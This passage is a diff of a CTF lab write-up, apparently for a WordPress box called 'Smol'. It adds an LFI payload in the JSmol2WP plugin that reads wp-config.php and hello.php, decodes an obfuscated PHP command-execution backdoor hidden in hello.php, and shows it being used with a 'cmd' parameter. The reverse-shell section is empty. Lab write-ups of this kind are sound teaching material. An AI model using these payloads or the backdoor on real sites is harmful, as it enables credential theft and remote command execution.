@@ -138,7 +138,10 @@ Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 
 We've managed to get a few `wordpress users` from the nmap script enumeration.
 
-After the nmap script is complete, we navigated to that location `http://www.smol.thm/wp-content/plugins/jsmol2wp/` and found few folders and files. So, I searched for the `jsmol2wp exploit` and there are a few mentioning `WordPress JSmol2WP <=1.07`, so we followed the `wpscan` website which has the `Local File Inclusion (LFI): http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php.` 
+After the nmap script is complete, we navigated to that location `http://www.smol.thm/wp-content/plugins/jsmol2wp/` and found few folders and files. After searching for the `jsmol2wp exploit` and there are a few mentioning `WordPress JSmol2WP <=1.07`, so we followed the `wpscan` website which has the `Local File Inclusion (LFI):
+```bash
+http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php.
+```
 
 ---
 ### Initial Access
@@ -154,7 +157,10 @@ The first tasks hints us that there could be a `Hello Dolly` plugin vulnerabilit
 #### What is `Hello Dolly` Plugin?
 **Hello Dolly** is a simple WordPress plugin that comes `preinstalled` in WordPress. It displays random lines from the song `Hello Dolly` by Louis Armstrong in the WordPress dashboard.
 
-Since, we have found the plugin is installed in the WordPress we can try to Directory Traversal to `plugins`. At the moment, we are here: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/` and we need to go back two steps to `http://www.smol.thm/wp-content/plugins/` to access `hello.php.` So, the complete address will look like this: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php.`
+Since, we have found the plugin is installed in the WordPress we can try to Directory Traversal to `plugins`. At the moment, we are here: `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/` and we need to go back two steps to `http://www.smol.thm/wp-content/plugins/` to access `hello.php.` So, the complete address will look like this: 
+```bash
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php.
+```
 
 Using the Directory Traversal/LFI, we have managed to get the `hello.php` plugin's content.
 
@@ -165,7 +171,21 @@ There's a base64 encoded code. Let's decode it.
 echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
 ```
 
-We get this code from the base64 encoded code: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. This line is using obfuscated PHP code - octal and hexadecimal character encoding and upon further decoding this, we get: `if (isset($_GET["cmd"])) { system($_GET["cmd"]); }.`
+We get this code from the base64 encoded code: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. This line is using **obfuscated PHP code** - **octal** and **hexadecimal** character encoding and upon further decoding this, we get: 
+```bash
+if (isset($_GET["cmd"])) { system($_GET["cmd"]); }.
+```
+
+This code is checking if the `cmd` parameter exists in the URL query string. If it does then it passes the value to `system()`, which executes the command and outputs the result on the web page. So, that means we can use this `cmd` parameter to execute our commands. I tried the following and it worked:
+```bash
+http://www.smol.thm/wp-admin/edit.php?cmd=ls
+```
+
+Now, lets try to get a reverse shell:
+```bash
+
+```
+
 
 
 
